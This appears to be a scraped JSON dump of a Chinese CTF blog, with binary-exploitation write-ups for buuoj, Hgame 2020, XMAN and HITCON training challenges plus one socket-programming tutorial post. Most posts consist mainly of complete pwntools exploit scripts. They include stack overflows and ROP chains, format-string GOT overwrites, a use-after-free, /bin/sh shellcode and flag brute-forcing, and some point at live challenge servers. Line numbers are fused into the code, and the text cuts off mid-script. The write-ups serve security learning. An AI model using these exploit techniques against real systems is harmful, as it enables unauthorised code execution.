binascii.a2b_hex(\"e4bda0e5a5bde5958a\")'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\\xe5\\x95\\x8a' 结果：","tags":[{"name":"PWN，Hgame2020","slug":"PWN，Hgame2020","permalink":"http://wafuter.jxustctf.top/tags/PWN%EF%BC%8CHgame2020/"}]},{"title":"buuoj-ciscn_2019_ne_5-writeup","date":"2020-01-20T07:46:42.000Z","path":"2020/01/20/buuoj-ciscn-2019-ne-5-writeup/","text":"这题溢出点比较明显， system也给了， 那么就差/bin/sh了， 直接利用pwntools的search在elf文件找， 找到/bin/sh后者sh都行， 程序中也用到了fflush函数， 所以sh是一定找的到了， 那么接下来就是构造payload的事了 12345678910111213141516171819202122232425262728293031323334353637383 from pwn import *4 import sys5 import os6 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])7 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context.log_level = 'debug'910 debug = 011 d = 1121314 def pwn():15 if debug == 1:16 exceve = \"./ciscn_2019_ne_5\"17 p = process(exceve)18 if d == 1:19 gdb.attach(p)20 else:21 ip = \"node3.buuoj.cn\"22 port = \"26354\"23 p = remote(ip, port)2425 def addlog(payload):26 p.sendlineafter(\"0.Exit\\n:\", str(1))27 p.sendlineafter(\"Please input new log info:\", payload)2829 elf = ELF(\"./ciscn_2019_ne_5\")3031 p.sendlineafter(\"Please input admin password:\", \"administrator\")3233 addlog('a'*0x4c + p32(elf.plt['system']) + p32(0xdeadbeef) + p32(elf.search('sh\\0').next()))3435 p.sendlineafter(\"0.Exit\\n:\", str(4))3637 p.interactive()3839 if __name__ == '__main__':40 pwn()","tags":[{"name":"buuoj, PWN","slug":"buuoj-PWN","permalink":"http://wafuter.jxustctf.top/tags/buuoj-PWN/"}]},{"title":"linux网络编程-第一篇","date":"2020-01-18T14:40:01.000Z","path":"2020/01/18/linux网络编程-第一篇/","text":"字节序与网络字节序转换byte ordering 有两种， 分别是小端序（Little-Endian）和大端序（Big-Endian）Big-Endian 又称为 Network Byte Order，因为这个顺序与我们网路型别的顺序一样 如果不知道本地字节顺序与网络字节顺序是否一致， 可以通过函数来进行转换从而保持一致比如, 将 short 从 Host Byte Order 转换为 Network Byte Order，用＂h＂代表＂host＂，用＂n＂代表＂network＂，而＂s＂代表＂short＂，所以是：h-to-n-s，或者htons()［读做：＂Host to Network Short＂］你可以用任何你想要的方式来组合＂n＂丶＂h＂丶＂s＂与＂l＂，不过别用太蠢的组合，比如：没有这样的函数 stolh() htons() host to network shorthtonl() host to network longntohs() network to host shortntohl() network to host long 数据结构12345678910struct addrinfo &#123; int ai_flags; // AI_PASSIVE, AI_CANONNAME等。 int ai_family; // AF_INET, AF_INET6, AF_UNSPEC int ai_socktype; // SOCK_STREAM, SOCK_DGRAM int ai_protocol; // 用 0 当作 \"any\" size_t ai_addrlen; // ai_addr 的大小, 单位是 Byte struct sockaddr \\*ai_addr; // struct sockaddr_in 或 \\_in6 char \\*ai_canonname; // 典型的hostname struct addrinfo \\*ai_next; //链表 下个节点&#125;; ai_family 栏位中设定强制使用 IPv4 或 IPv6，或者将它设定为 AF_UNSPEC，AF_UNSPEC 很酷，因为这样你的程序就可以不用管 IP 的版本 1234struct sockaddr &#123; unsigned short sa_family; // address family, AF_xxx char sa_data[14]; // 14 bytes of protocol address&#125;; sa_family 可以是任何东西，不过在这份教程中我们会用到的是 AF_INET［IPv4］或 AF_INET6［IPv6］。sa_data 包含一个 socket 的目地地址与 port number。这样很不方便，因为你不会想要手动的将地址封装到 sa_data 里。 为了处理 struct sockaddr，程序设计师建立了对等平行的数据结构：struct sockaddr_in［＂in＂是代表＂internet＂］而这有个重点：指向 struct sockaddr_in 的指针可以转型（cast）为指向 struct sockaddr 的指针，反之亦然。所以即使 connect() 需要一个 struct sockaddr *，你也可以用 struct sockaddr_in，并在最後的时候对它做型别转换！ IPv412345678910struct sockaddr_in &#123; short int sin_family; // Address family, AF_INET unsigned short int sin_port; // Port number struct in_addr sin_addr; // Internet Address unsigned char sin_zero[8]; // 与 struct sockaddr 相同的大小&#125;;struct in_addr &#123; uint32_t s_addr; // that's a 32-bit int (4 bytes)&#125;; 这个数据结构让它很容易可以参考（reference）socket 地址的成员。要注意的是 sin_zero［这是用来将数据结构补足符合 struct sockaddr 的长度］，应该要使用 memset()函数将 sin_zero 整个清为零。还有，sin_family 是对应到 struct sockaddr 中的 sa_family，并应该设定为＂AF_INET＂。最後，sin_port 必须是 Network Byte Order［利用 htons()］ IPv61234567891011struct sockaddr_in6 &#123; u_int16_t sin6_family; // address family, AF_INET6 u_int16_t sin6_port; // port number, Network Byte Order u_int32_t sin6_flowinfo; // IPv6 flow information struct in6_addr sin6_addr; // IPv6 address u_int32_t sin6_scope_id; // Scope ID&#125;;struct in6_addr &#123; unsigned char s6_addr[16]; //IPv6 address&#125;; 要注意到 IPv6 协议有一个 IPv6 address 与一个 port number，就像 IPv4 协议有一个 IPv4 address 与 port number 一样IPv6的流量资料与Scope ID 暂未接触 IP address 的的转换 inet_pton() 函数将 IP address 转换为数值与句号的符号，并依照你指定的 AF_INET 或 AF_INET6 来决定要储存在 struct in_addr 或 struct in6_addr,［＂pton＂的意思是＂presentation to network＂，你可以称之为＂printable to network＂ 示例 1234struct sockaddr_in sa; // IPv4struct sockaddr_in6 sa6; // IPv6inet_pton(AF_INET, \"192.0.2.1\", &amp;(sa.sin_addr)); // IPv4inet_pton(AF_INET6, \"2001:db8:63b3:1::3490\", &amp;(sa6.sin6_addr)); // IPv6 以数字与句号(.)打印出struct in_addr或以十六进制与冒号打印出struct in6_addr 可以使用 inet_ntop()函数［＂ntop＂意谓＂network to presentation＂－如果有比较好记的话，你可以称它为＂network to prinable＂］ 示例 12345678910// IPv4:char ip4[INET_ADDRSTRLEN]; // 储存 IPv4 字符串的空间struct sockaddr_in sa; // pretend this is loaded with somethinginet_ntop(AF_INET, &amp;(sa.sin_addr), ip4, INET_ADDRSTRLEN);printf(\"The IPv4 address is: %s\\n\", ip4);// IPv6:char ip6[INET6_ADDRSTRLEN]; // 储存 IPv6 字符串的空间struct sockaddr_in6 sa6; // pretend this is loaded with somethinginet_ntop(AF_INET6, &amp;(sa6.sin6_addr), ip6, INET6_ADDRSTRLEN);printf(\"The address is: %s\\n\", ip6); 当你调用它时，你会传递地址的型别［IPv4 或 IPv6］，该地址是一个指向储存结果的字符串，与该字符串的最大长度。［有两个 macro（宏）可以很方便地储存你想储存的最大 IPv4 或 IPv6 地址字符串大小：INET_ADDRSTRLEN 与 INET6_ADDRSTRLEN］ 最後，这些函数只能用在数值的 IP address 上","tags":[{"name":"Netword Programming","slug":"Netword-Programming","permalink":"http://wafuter.jxustctf.top/tags/Netword-Programming/"}]},{"title":"buuoj-babyrop-writeup","date":"2020-01-18T05:39:28.000Z","path":"2020/01/18/buuoj-babyrop-writeup/","text":"这题只看了程序里面的函数没有观察plt里面的函数导致忽视了puts函数， 用write函数泄露libc地址…, 之后各种栈迁移最后终于成功写出exp后发现好像栈迁移到bss段的话system函数执行不了， 执行到一半总会出现段错误， 隔天在看程序突然发现plt表有puts函数…., 那就简单多了T_T read函数不会被’\\0’截断， 所以利用’\\0’就可以绕过那个检查， 之后就是常规的rop了 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 1 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 011 d = 11213 def pwn():14 execve = \"./babyrop\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"node3.buuoj.cn\"22 host = \"29458\"23 p = remote(ip, host)2425 elf = ELF(\"./babyrop\")26 libc = ELF(\"./bp_libc-2.23.so\")27 #libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")2829 def write_of():30 payload = '\\x00'*0x6 + '\\0' + '\\xff'31 p.send(payload.ljust(0x20, '\\x00'))3233 write_of()3435 start = 0x080485A036 payload = '\\x00'*(0xe7 + 4) + p32(elf.plt['puts']) + p32(start) + p32(elf.got['puts'])37 p.send(payload.ljust(0xff, '\\x00'))3839 p.recvuntil(\"Correct\\n\")4041 leak = u32(p.recv(4))42 libc_base = leak - libc.symbols['puts']43 log.info(\"libc_base -&gt; \" + hex(libc_base))4445 write_of()4647 #one_gadget = [0x3ac5c, 0x3ac5e, 0x3ac62, 0x3ac69, 0x5fbc5]48 one_gadget = [0x3a80c, 0x3a80e, 0x3a812, 0x3a819, 0x5f065]4950 payload = '\\x00'*(0xe7 + 4) + p32(libc_base+one_gadget[0])51 p.send(payload.ljust(0xff, '\\x00'))525354 p.interactive()5556 if __name__ == '__main__':57 pwn()","tags":[{"name":"PWN, buuoj","slug":"PWN-buuoj","permalink":"http://wafuter.jxustctf.top/tags/PWN-buuoj/"}]},{"title":"XMAN-no_call  复现","date":"2020-01-17T14:52:17.000Z","path":"2020/01/17/XMAN-no-call-复现/","text":"这题看的时候没想到一点办法..保护全开， 系统调用全部禁止， 束手无策T_T 看了大佬的exp后才知道可以爆破， 以前没怎么接触这回长见识了 程序中要求输入的shellcode长度限制在0x10个字节内， 思路明确是爆破flag， flag所在的地址直接观察mmap函数可以知道是0x200000000, 那么只要用字符对这个地址的内容进行多次比较检验就可以爆破出flag exp: 1234567891011121314151617181920212223242526272829301 from pwn import *2 from string import printable34 context.arch = 'amd64'56 flag = 0x2000000007 flagx = ''89 for j in range(0x20):10 for i in printable:11 s = process(\"./chall\")12 payload = \"\"\"13 mov rax, &#123;&#125;14 cmp byte ptr [rax], &#123;&#125;15 jz $ // $ 代本身这条指令的地址， 如果flag中的字符与printable的字符相等， 那么程序会一直往本指令跳转， 会出现等同于程序暂停的状态， 后面的recv的timeout就是测试是否爆破成功的16 ret17 \"\"\".format(hex(j+flag), ord(i))1819 s.recv()20 s.send(asm(payload))2122 try:23 s.recv(timeout=1)24 flagx += i25 print flagx26 break27 except :28 continue2930 log.info(\"flag -&gt; \" + flag) //脚本跑的时候不知道为什么总会崩到， 这条语句总是没有执行， 不过靠上面的print flagx也可以观察爆破情况","tags":[{"name":"PWN, XMAN_2019","slug":"PWN-XMAN-2019","permalink":"http://wafuter.jxustctf.top/tags/PWN-XMAN-2019/"}]},{"title":"Hgame-week1-writeup","date":"2020-01-17T07:15:01.000Z","path":"2020/01/17/Hgame-week1-writeup/","text":"Hard_AAAAA由于memcmp 函数要比较的是7个字节， 观察IDA中的数据就可以构造payload了 123456789101112131415161718192021222324252627282930311 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 011 d = 01213 def pwn():14 execve = \"./Hard_AAAAA\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"47.103.214.163\"22 host = \"20000\"23 p = remote(ip, host)2425 payload = 'a'*(0xac - 0x31) + \"0O0o\\0\" + \"O0\\0\"26 p.sendlineafter(\"Let's 0O0o\\\\0O0!\", payload)2728 p.interactive()2930 if __name__ == '__main__':31 pwn() Number_Killed保护全关 仔细观察程序逻辑可以发现for循环内存在缓存区溢出，再靠考虑程序保护全关， 比较容易想到植入shellcode程序中存在一个gift函数， 看伪代码也许不懂什么作用， 但是观察汇编代码的话会发现有条jmp rsp 指令， 这就有了明确的做题思路 –覆盖ret为jmp rsp 指令的地址， 后面植入shellcode， 之后就可以getshell了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647481 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 #context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 011 d = 11213 def pwn():14 execve = \"./Number_Killer\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"47.103.214.163\"22 host = \"20001\"23 p = remote(ip, host)2425 elf = ELF(\"./Number_Killer\")26 jmp_rsp = 0x40078D27 shellcode = \"\\x48\\x31\\xc0\\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x48\\x89\\xe7\\x48\\x31\\xd2\\x48\\x31\\xf6\\xb0\\x3b\\x0f\\x05\"2829 p.recvuntil(\"Let's Pwn me with numbers!\")3031 for i in range(13):32 p.sendline('47550060152') # 0xD123456783334 p.sendline(str(int(jmp_rsp)))3536 p.sendline(str(7075083856935661896))37 p.sendline(str(5212749937626803817))38 p.sendline(str(-706703598913263735))39 p.sendline(str(int(0x50f3bb0)))4041 raw_input()4243 p.send('\\n'*2)4445 p.interactive()4647 if __name__ == '__main__':48 pwn() One_Shotname, flag 都是位于bss段的变量， 而且name与flag的间距为32个字节， 所以只要控制这32个字节不出现截断即可把flag输出 12345678910111213141516171819202122232425262728293031321 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 #context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 011 d = 01213 def pwn():14 execve = \"./One_Shot\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"47.103.214.163\"22 host = \"20002\"23 p = remote(ip, host)242526 p.sendlineafter(\"Firstly....What's your name?\\n\", 'a'*31)27 p.sendafter(\"Take tne only one shot!\\n\", str(int(0x6010DF)))2829 p.interactive()3031 if __name__ == '__main__':32 pwn() ROP_LEVEL0main 函数中的最后一个read函数存在溢出， 但是题目没给libc， 题目又是64位的， nc连上去题目提示不能直接catflag， 只能通过open， read等函数将flag输出来那么可以利用下面的通用gadget来调用这些函数最终读出flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556571 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 011 d = 11213 def pwn():14 execve = \"./ROP_LEVEL0\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"47.103.214.163\"22 host = \"20003\"23 p = remote(ip, host)2425 elf = ELF(\"./ROP_LEVEL0\")2627 main = 0x40065B28 loc1 = 0x40073029 loc2 = 0x40074A3031 payload = '\\x00'*(0x50+8) + p64(loc2)32 payload += p64(0) + p64(1) + p64(elf.got['read']) + p64(0x10) + p64(elf.bss()+0x200) + p64(0) + p64(loc1)33 payload += p64(0)*7 + p64(main)34 p.sendafter(\"You can not only cat flag but also Opxx Rexx Wrxxx ./flag\", payload.ljust(0x100, '\\x00'))3536 p.sendline('./flag\\0')3738 payload = '\\x00'*(0x50+8) + p64(loc2)39 payload += p64(0) + p64(1) + p64(elf.got['open']) + p64(0)*2 + p64(elf.bss()+0x200) + p64(loc1)40 payload += p64(0)*7 + p64(main)41 p.sendafter(\"You can not only cat flag but also Opxx Rexx Wrxxx ./flag\", payload.ljust(0x100, '\\x00'))4243 raw_input()44 payload = '\\x00'*(0x50+8) + p64(loc2)45 payload += p64(0) + p64(1) + p64(elf.got['read']) + p64(0x60) + p64(elf.bss()+0x220) + p64(5) + p64(loc1)46 payload += p64(0)*7 + p64(main)47 p.sendafter(\"You can not only cat flag but also Opxx Rexx Wrxxx ./flag\", payload.ljust(0x100, '\\x00'))4849 payload = '\\x00'*(0x50+8) + p64(loc2)50 payload += p64(0) + p64(1) + p64(elf.got['puts']) + p64(0)*2 + p64(elf.bss() + 0x220) + p64(loc1)51 payload += p64(0)*7 + p64(main)52 p.sendafter(\"You can not only cat flag but also Opxx Rexx Wrxxx ./flag\", payload.ljust(0x100, '\\x00'))5354 p.interactive()5556 if __name__ == '__main__':57 pwn() 结果：","tags":[{"name":"PWN, Hgame","slug":"PWN-Hgame","permalink":"http://wafuter.jxustctf.top/tags/PWN-Hgame/"}]},{"title":"HITCONING training 6-10 writeup","date":"2020-01-07T02:57:55.000Z","path":"2020/01/07/HITCONING-training-6-10-writeup/","text":"migrationemmm, 这题的做法跟前面的一道题差不多， 都可以泄露libc地址，进行栈迁移， 然后执行system函数来getshell， 差不多的思路就不重复写了 crack除了pie和改写重定位表以外的保护都开了 程序逻辑为从urandom文件中读取4个字节作为password， 由于urandom这个文件的内容是随机的， 所以password不可控， 但是后面有个格式化字符串漏洞，并且参数在栈上， 那么可以利用”%10$s” 泄露出password， 之后就可以cat flag了 1234567891011121314151617181920212223242526272829303132333435363738391 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./crack\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./crack\")2627 payload = p32(elf.symbols['password']) + \"%10$s\"28 p.sendlineafter(\"What your name ? \", payload)2930 p.recv(11)31 leak = u32(p.recv(4))32 log.info(\"leak -&gt; \" + hex(leak))3334 p.sendlineafter(\"Your password :\", str(leak))3536 p.interactive()3738 if __name__ == '__main__':39 pwn() cat flag: craxme开了NX和CANARY 又是一个格式化控制字符串漏洞的题目， 不过这次不是要我们泄露数据， 而是向内存中写入数据一个为218一个为0xfaceb00c(-87117812)第一个好解决， 第二个需要分段写入， %hn往内存中写入两个字节 12345678910111213141516171819202122232425262728293031323334351 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./craxme\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./craxme\")2627 #payload = p32(elf.symbols['magic']) + \"%&#123;&#125;c%7$n\".format(218 - 4) flag28 payload = p32(elf.symbols['magic']) + \"%&#123;&#125;c%7$hn&gt;&gt;&gt;&gt;\".format((0xfaceb00c &amp; 0xffff)-4)29 payload += p32(elf.symbols['magic']+2) + \"%&#123;&#125;c%12$hn\".format((0xfaceb00c &gt;&gt; 16) - 0xb00c - 4 - 4)30 p.sendlineafter(\"Give me magic :\", payload)3132 p.interactive()3334 if __name__ == '__main__':35 pwn() cat flag: playfmt= = 格式化字符串漏洞三连… 只开了NX 这题printf的参数不在栈上在bss段， 但是可以无限次利用这个漏洞， 所以思路还是有得， 不过比较麻烦， 覆写got表需要在一次printf调用中完成，这就使得需要很多准备工作 1.利用 序号1 处得两个方框内栈的地址之间的指向关系， 将地址0xff849628 的内容改成strncmp 的got表地址2.再利用 序号2 处的方框内的的栈的地址之间的指向关系， 将地址0xff8496e4 的内容改成strncmp的got表地址+23.之后就是向strncmp_got内写入system的低两个字节， strncmp_got+2内写入system的高两个字节， 这样就可以成功覆盖strncmp的got表内容为system4.最后就是输入buf为/bin/sh 就可以getshell了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485861 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./playfmt\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./playfmt\")26 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")2728 str_got = elf.got['strncmp']2930 p.recvline()31 p.recvline()32 p.recvline()3334 p.sendline(\"%10$p\")35 leak = int(p.recvline()[:-1], 16)3637 payload = \"%&#123;&#125;c%10$hn\\0\".format(str_got &amp; 0xffff)38 p.send(payload.ljust(0xc8, '\\x00'))3940 payload = \"%&#123;&#125;c%6$hn&gt;&gt;\\0\".format((leak &amp; 0xffff) + 2)41 p.send(payload.ljust(0xc8, '\\x00'))4243 payload = \"%&#123;&#125;c%10$hn\".format(str_got &gt;&gt; 16)44 p.send(payload.ljust(0xc8, '\\x00'))4546 payload = \"%8$p\"47 p.send(payload.ljust(0xc8, '\\x00'))4849 p.recvuntil(\"@&gt;&gt;\")50 p.recvuntil(\"@\")51 leak_libc = int(p.recv(10), 16)52 log.info(\"leak_libc -&gt; \" + hex(leak_libc))5354 libc_base = leak_libc - libc.symbols['_IO_2_1_stdout_']55 log.info(\"libc_base -&gt; \" + hex(libc_base))56 system = libc_base + libc.symbols['system']5758 payload = \"&gt;&gt;&gt;%21$p\"59 p.send(payload.ljust(0xc8, '\\x00'))6061 p.recvuntil(\"&gt;&gt;&gt;\")62 leak_stack = int(p.recv(10), 16)63 log.info(\"leak_stack -&gt; \" + hex(leak_stack))64 # strncmp_got + 265 #0xe4 -&gt; 5766 payload = \"%&#123;&#125;c%22$hn\".format((leak_stack &amp; 0xffff) + 2)67 p.send(payload.ljust(0xc8, '\\x00'))6869 payload = \"%&#123;&#125;c%21$hn\".format((str_got &amp; 0xffff) + 2)70 p.send(payload.ljust(0xc8, '\\x00'))7172 payload = \"%&#123;&#125;c%59$hn\".format(str_got &gt;&gt; 16)73 p.send(payload.ljust(0xc8, '\\x00'))7475 payload = \"%&#123;&#125;c%14$hn\".format(system &amp; 0xffff)76 payload += \"%&#123;&#125;c%57$hn\".format((system &gt;&gt; 16) - (system &amp; 0xffff))77 p.send(payload.ljust(0xc8, '\\x00'))7879 payload = '/bin/sh\\0'80 p.send(payload.ljust(0xc8, '\\x00'))8182 p.interactive()8384 if __name__ == '__main__':85 pwn() getshell hacknote开了NX和CANARY 是个堆类型的题目， 在del_note中存在UAF漏洞， 限制的chunk的个数最多为5， 第一时间想到两种利用方式， 1.控制程序中的print_note函数中的函数指针2.进行常规的fastbin attack， 不过限制了chunk的大小， 而且感觉第一种更方便， 所以就用第一种了 利用思路：在print_note中调用的函数指针， 只要控制了函数指针指向system函数就可以达到getshell的目的， 具体步骤 1.创建一个大小大于fastbin大小的chunk， 随后free掉， 在分配一个大小不大于这个chunk的chunk， 随后利用print_note函数泄露libc地址2.这个程序的chunk结构chunk 的 data区data -&gt; &amp;print_note_contentdata+4 -&gt; 输入的数据data+… -&gt; 输入的数据或0 由于箭头指向的malloc是程序中分配的，不可控， 所以需要利用UAF漏洞重用这段chunk来让data -&gt; system 3.释放两个chunk， 在malloc(8)输入数据为p32(system) + “||sh\\0” 即可达成目的 由于题目也准备好了后门， 直接让data-&gt; &amp;magic也行 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162631 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./hacknote\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 def add(size, content):26 p.sendlineafter(\"Your choice :\", str(1))27 p.sendlineafter(\"Note size :\", str(size))28 p.sendafter(\"Content :\", content)2930 def free(index):31 p.sendlineafter(\"Your choice :\", str(2))32 p.sendafter(\"Index :\", str(index))3334 def printf(index):35 p.sendafter(\"Your choice :\", str(3))36 p.sendafter(\"Index :\", str(index))3738 add(0x100, 'a') #039 add(0x20, 'b') #140 add(0x20, 'c') #241 free(0)42 add(0x100, '&gt;&gt;&gt;&gt;') #3 -&gt; 043 printf(3)4445 p.recvuntil(\"&gt;&gt;&gt;&gt;\")46 leak = u32(p.recvline()[:-1])47 libc_base = leak - (0xf7f5f7b0 - 0xf7dad000)48 log.info(\"leak -&gt; \" + hex(libc_base))4950 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")51 system = libc_base + libc.symbols['system']5253 free(1)54 free(2)55 raw_input()56 add(8, p32(system) + \"||sh\\0\") #457 printf(1)585960 p.interactive()6162 if __name__ == '__main__':63 pwn() getshell","tags":[{"name":"PWN","slug":"PWN","permalink":"http://wafuter.jxustctf.top/tags/PWN/"}]},{"title":"HITCON training 1-5 writeup ","date":"2020-01-05T08:29:00.000Z","path":"2020/01/05/HITCON-training-writeup/","text":"由于期末考的原因， 好久没写题了， 做hitcon training 的题目来熟悉熟悉 sysmagic查看保护可以看到程序没开pie与got， plt 表之类的可以改写 程序逻辑比较简单不啰嗦了， 经过观察buf的值不可控但是flag比较明显是for循环内输出的东西， 而putchar 内的数据代码中都有， 所以第一想法是写个C语言脚本直接输出 1234567891011121314151617 1 #include &lt;stdio.h&gt; 2 #include &lt;string.h&gt; 3 #include &lt;stdlib.h&gt; 4 5 int main(int argc, char **argv)&#123; 6 int d[] = &#123;2036297540, 1801418095, 1601662830, 1601792119, 1952414061, 7 1835884901, 1600484449, 1851880015, 1767859559, 8 1869832051, 1735287135, 1061124466, 63&#125;; 9 char s[] = &#123;7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89,10 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0,11 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91,12 49, 85, 2, 30, 33, 16, 76, 30, 66&#125;;13 for(int i = 0;i &lt;= 0x30;++i)&#123;14 putchar(*((char*)d + i) ^ s[i]);15 &#125;16 return 0;17 &#125; flag: 看到flag的瞬间毫无防备的留下了弱者的泪水， 能动态调试为什么要费时间写脚本呢… orw查看保护除了栈溢出保护其它保护全关了 程序逻辑简单， 要求输入shellcode来执行指令， 不过程序用了沙箱禁用了exceve系统调用， 不过没有禁用read, write, open等系统调用， 所以可以通过执行这三个系统调用直接把flag读出来关于沙箱这篇文章讲的比较详细：seccomp学习笔记通过执行seccomp-tools dump ./orw 可以查看可以执行哪些系统调用系统调用号查询:linux 系统调用号表 汇编代码(我用的是ATT格式)： 12345678910111213141516171819202122232425262728291 .section .text2 .globl _start3 4 _start:5 xor %eax, %eax6 movl $0x804A09b, %ebx7 movl $4, %ecx8 xor %edx, %edx9 movb $5, %al10 int $0x8011 12 movl %eax, %ebx13 pushl %esp14 movl %esp, %ecx15 movl $0x30, %edx16 xor %eax, %eax17 movb $3, %al18 int $0x8019 20 movl $1, %ebx21 pushl %esp22 popl %ecx23 movl $0x30, %edx24 xor %eax, %eax25 movb $4, %al26 int $0x8027 28 movl $1, %eax29 int $0x80 成功读取flag(由于没有靶机， 所以我在本地创建了一个flag文件) ret2sc保护全关 看到程序逻辑就是栈迁移执行shellcode具体步骤为将shellcode植入到bss段， 之后再将栈迁移到bss段中，然后就可以getshell了 1234567891011121314151617181920212223242526272829303132333435361 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 11213 def pwn():14 execve = \"./ret2sc\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./ret2sc\")2627 shellcode = p32(elf.symbols['name'] + 4) + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"28 p.sendlineafter(\"Name:\", shellcode)2930 payload = 'a'*(0x14+8) + p32(elf.symbols['name'] - 4) + p32(0x804853c)31 p.sendlineafter(\"Try your best:\", payload)3233 p.interactive()3435 if __name__ == '__main__':36 pwn() 成功getshell ret2lib除了栈上数据不可执行以外的保护全关了 程序逻辑分析：程序中可以指定一个地址并且输出这个地址的内容， 随后的print_message函数中很明显存在栈溢出 那么思路就比较明了了， 先泄露libc地址， 随后计算出libc基址，之后利用栈溢出执行system， 最后getshell由于泄露地址后可以直接利用LibcSearcher 搜索出libc版本， 为了方便我直接用本机的libc版本 123456789101112131415161718192021222324252627282930313233343536373839404142434445461 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./ret2lib\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./ret2lib\")26 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")2728 p.sendlineafter(\"Give me an address (in dec) :\", 